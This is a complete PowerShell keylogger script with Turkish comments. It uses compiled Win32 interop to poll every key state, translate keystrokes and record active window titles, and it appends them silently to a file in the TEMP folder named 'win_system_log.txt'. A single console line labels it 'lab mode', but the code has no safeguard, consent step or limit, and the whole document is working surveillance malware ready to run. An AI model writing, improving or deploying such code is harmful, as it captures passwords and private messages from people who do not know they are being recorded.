# 1. Ortamı Sessizleştir ve Gerekli DLL'leri Yükle
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 2. Win32 API Tanımlaması (Referans Hataları Giderilmiş)
if (-not ([System.Management.Automation.PSTypeName]'Win32Native').Type) {
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.ReferencedAssemblies.Add("System.Windows.Forms.dll") | Out-Null
    $cp.ReferencedAssemblies.Add("System.dll") | Out-Null

    $source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    public class Win32Native {
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
    }
"@
    Add-Type -TypeDefinition $source -CompilerParameters $cp
}

# 3. Ayarlar (TEMP Klasörü ve Dosya Adı)
$logPath = "$env:TEMP\win_system_log.txt"
$lastWindow = ""
$prevState = @{}

# Başlangıç Bilgisi (Sadece Konsolda Görünür)
Write-Host "[!] Lab Modu: ANLIK KAYIT AKTIF." -ForegroundColor Yellow
Write-Host "[!] Hedef: $logPath" -ForegroundColor Yellow

# 4. Ana Döngü
while ($true) {
    Start-Sleep -Milliseconds 15

    # Aktif Pencereyi Kontrol Et
    $currentHWnd = [Win32Native]::GetForegroundWindow()
    $windowTitle = New-Object System.Text.StringBuilder 256
    [Win32Native]::GetWindowText($currentHWnd, $windowTitle, 256) | Out-Null
    $currTitleStr = $windowTitle.ToString()

    if ($currTitleStr -and ($currTitleStr -ne $lastWindow)) {
        $lastWindow = $currTitleStr
        $timestamp = Get-Date -Format "HH:mm:ss"
        $header = "`r`n`r`n[--- $lastWindow ($timestamp) ---]`r`n"
        Add-Content -Path $logPath -Value $header -NoNewline
    }

    # Klavye Durumunu Al
    $keyState = New-Object byte[] 256
    [Win32Native]::GetKeyboardState($keyState) | Out-Null

    # Tuşları Tara
    for ($i = 8; $i -le 254; $i++) {
        $isPressed = ([Win32Native]::GetAsyncKeyState($i) -band 0x8000) -ne 0
        if ($isPressed -and -not $prevState[$i]) {
            $sb = New-Object System.Text.StringBuilder 5
            $scanCode = [Win32Native]::MapVirtualKey($i, 0)
            $res = [Win32Native]::ToUnicode($i, $scanCode, $keyState, $sb, $sb.Capacity, 0)

            $keyOutput = ""
            if ($res -gt 0) {
                $keyOutput = $sb.ToString()
            } else {
                $spec = [System.Windows.Forms.Keys]$i
                switch ($spec) {
                    "Enter" { $keyOutput = "[ENTER]`r`n" }
                    "Back"  { $keyOutput = "[BS]" }
                    "Space" { $keyOutput = " " }
                    "Tab"   { $keyOutput = "[TAB]" }
                }
            }

            # ANLIK YAZMA: Her tuş basımında dosyaya ekle
            if ($keyOutput) {
                Add-Content -Path $logPath -Value $keyOutput -NoNewline
            }
        }
        $prevState[$i] = $isPressed
    }
}
